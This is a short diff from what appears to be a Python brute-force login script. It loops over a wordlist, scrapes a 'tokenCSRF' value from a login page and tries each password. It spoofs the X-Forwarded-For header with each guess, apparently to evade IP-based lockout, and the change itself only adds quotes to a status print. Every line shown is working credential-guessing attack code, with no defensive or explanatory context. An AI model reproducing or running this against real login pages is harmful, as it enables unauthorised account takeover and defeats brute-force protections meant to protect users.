@@ -45,7 +45,7 @@ for password in wordlist:
     csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
     # removing new line char
     password = password.rstrip()
-    print('[*] Trying pw: {p}'.format(p = password))
+    print('[*] Trying pw: "{p}"'.format(p = password))
 
     headers = {
         'X-Forwarded-For': password,
